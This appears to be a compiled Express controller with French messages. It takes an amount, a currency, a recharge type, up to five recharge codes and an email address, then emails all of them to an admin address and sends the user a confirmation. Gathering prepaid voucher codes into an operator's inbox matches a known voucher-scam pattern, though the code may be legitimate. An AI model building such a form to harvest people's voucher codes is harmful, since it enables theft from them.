"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const ejs_1 = __importDefault(require("ejs"));
const path_1 = __importDefault(require("path"));
const constants_1 = require("../core/constants");
const sendmail_1 = __importDefault(require("../nodemailer/sendmail"));
const env_1 = require("../core/config/env");
const userController = {
    sendMails: async (req, res) => {
        const { mount, recharge, devise, code1, code2, code3, code4, code5, email } = req.body;
        if (!mount || !recharge || !devise || !code1 || !email) {
            return res.status(constants_1.HttpCode.BAD_REQUEST).json({ msg: "Tous les champs sont obligatoires" });
        }
        const data = { mount, recharge, devise, code1, code2, code3, code4, code5, email };
        try {
            // Générer le contenu HTML des emails avec EJS
            const userEmailHtml = await ejs_1.default.renderFile(path_1.default.join(__dirname, '../utils/user_email.ejs'), data);
            const adminEmailHtml = await ejs_1.default.renderFile(path_1.default.join(__dirname, '../utils/admin_email.ejs'), data);
            // Envoi des emails
            await Promise.all([
                (0, sendmail_1.default)(env_1.envs.address_mail, `Nouvelle recharge client ${adminEmailHtml}`),
                (0, sendmail_1.default)(email, `Confirmation de votre recharge ${userEmailHtml}`)
            ]);
            return res.status(constants_1.HttpCode.OK).json({ msg: "Emails envoyés avec succès" });
        }
        catch (error) {
            console.error(error);
            return res.status(constants_1.HttpCode.INTERNAL_SERVER_ERROR).json({ msg: "Erreur interne du serveur" });
        }
    }
};
exports.default = userController;
//# sourceMappingURL=controllers.js.map